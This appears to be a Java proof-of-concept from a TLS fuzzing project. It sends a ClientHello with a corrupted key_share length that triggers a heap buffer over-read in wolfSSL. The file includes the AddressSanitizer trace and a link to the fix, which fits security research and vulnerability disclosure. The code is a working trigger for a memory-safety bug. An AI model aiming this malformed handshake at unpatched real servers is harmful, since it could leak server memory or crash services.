package com.gypsyengineer.tlsbunny.poc.wolfssl;

import com.gypsyengineer.tlsbunny.fuzzer.FuzzedVector;
import com.gypsyengineer.tlsbunny.tls.Struct;
import com.gypsyengineer.tlsbunny.tls.Vector;
import com.gypsyengineer.tlsbunny.tls13.client.HttpsClient;
import com.gypsyengineer.tlsbunny.tls13.fuzzer.FuzzyStructFactory;
import com.gypsyengineer.tlsbunny.tls13.struct.KeyShareEntry;
import com.gypsyengineer.tlsbunny.tls13.struct.NamedGroup;
import com.gypsyengineer.tlsbunny.tls13.struct.StructFactory;

import java.io.IOException;

import static com.gypsyengineer.tlsbunny.utils.HexDump.printHexDiff;
import static com.gypsyengineer.tlsbunny.utils.WhatTheHell.whatTheHell;

/**
 * TLSX_KeyShareEntry_Parse() function might read out of the "input" buffer
 * while parsing key_share extensions from a malformed ClientHello message.
 * It doesn't seem to be possible to read much.
 *
 * Fixed in https://github.com/wolfSSL/wolfssl/pull/2082
 *
 * Here what ASan said:
 *
 * ==5064==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60e00000dff1 at pc 0x7fb0fba8c935 bp 0x7ffc62c8c020 sp 0x7ffc62c8b7c8
 * READ of size 67 at 0x60e00000dff1 thread T0
 * #0 0x7fb0fba8c934 in __asan_memcpy (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x8c934)
 * #1 0x7fb0fb6fbbbe in TLSX_KeyShareEntry_Parse src/tls.c:6557
 * #2 0x7fb0fb6fc3f6 in TLSX_KeyShare_Parse src/tls.c:6672
 * #3 0x7fb0fb7066f6 in TLSX_Parse src/tls.c:9914
 * #4 0x7fb0fb710ead in DoTls13ClientHello src/tls13.c:3927
 * #5 0x7fb0fb71c166 in DoTls13HandShakeMsgType src/tls13.c:7166
 * #6 0x7fb0fb71d05b in DoTls13HandShakeMsg src/tls13.c:7369
 * #7 0x7fb0fb6a5c80 in ProcessReply src/internal.c:13221
 * #8 0x7fb0fb6e7fe5 in wolfSSL_accept src/ssl.c:9507
 * #9 0x4094b1 in server_test examples/server/server.c:2047
 * #10 0x409ebb in main examples/server/server.c:2348
 * #11 0x7fb0fafa482f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
 * #12 0x402dd8 in _start (/home/artem/projects/tlsbunny/ws/wolfssl/wolfssl/examples/server/.libs/lt-server+0x402dd8)
 *
 * 0x60e00000dff1 is located 0 bytes to the right of 145-byte region [0x60e00000df60,0x60e00000dff1)
 * allocated by thread T0 here:
 * #0 0x7fb0fba98602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
 * #1 0x7fb0fb630abc in wolfSSL_Malloc wolfcrypt/src/memory.c:127
 * #2 0x7fb0fb6922cc in GrowInputBuffer src/internal.c:7038
 * #3 0x7fb0fb6a3834 in GetInputData src/internal.c:12704
 * #4 0x7fb0fb6a49ad in ProcessReply src/internal.c:12997
 * #5 0x7fb0fb6e7fe5 in wolfSSL_accept src/ssl.c:9507
 * #6 0x4094b1 in server_test examples/server/server.c:2047
 * #7 0x409ebb in main examples/server/server.c:2348
 * #8 0x7fb0fafa482f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
 */
public class HeapOverReadInKeyShareEntry {

    public static void main(String[] args) throws Exception {
        try (HttpsClient client = new HttpsClient()) {
            client.to(40101).set(new BadStructFactory()).connect();
        }
    }

    private static class BadStructFactory extends FuzzyStructFactory<Object> {

        BadStructFactory() {
            super(StructFactory.getDefault());
        }

        @Override
        public KeyShareEntry createKeyShareEntry(NamedGroup group, byte[] bytes) {
            return fuzzKeyShareEntry(factory.createKeyShareEntry(group, bytes));
        }

        private KeyShareEntry fuzzKeyShareEntry(KeyShareEntry entry) {
            System.out.println("fuzz KeyShareEntry");
            try {
                Vector<Byte> key_exchange = entry.keyExchange();

                byte[] bytes = key_exchange.bytes();
                byte[] corrupted_bytes = bytes.clone();
                corrupted_bytes[bytes.length - 2] = 0;
                corrupted_bytes[bytes.length - 1] = (byte) 67;
                int corrupted_length = bytes.length - 4;
                FuzzedVector<Byte> corrupted_key_exchange = new FuzzedVector<>(
                        KeyShareEntry.key_exchange_length_bytes,
                        corrupted_length,
                        corrupted_bytes);
                diff("KeyShareEntry.key_exchange", key_exchange, corrupted_key_exchange);

                entry.keyExchange(corrupted_key_exchange);
                return entry;
            } catch (IOException e) {
                throw whatTheHell("could not fuzz KeyShareEntry", e);
            }
        }

        private void diff(String what, Struct original, Struct fuzzed) throws IOException {
            byte[] originalEncoding = original.encoding();
            byte[] fuzzedEncoding = fuzzed.encoding();

            System.out.printf("%s (original):%n", what);
            System.out.printf("%s%n", printHexDiff(originalEncoding, fuzzedEncoding));
            System.out.printf("%s (fuzzed):%n", what);
            System.out.printf("%s%n", printHexDiff(fuzzedEncoding, originalEncoding));
        }

        @Override
        public Object fuzz(Object object) {
            throw whatTheHell("you should not be here!");
        }
    }
}
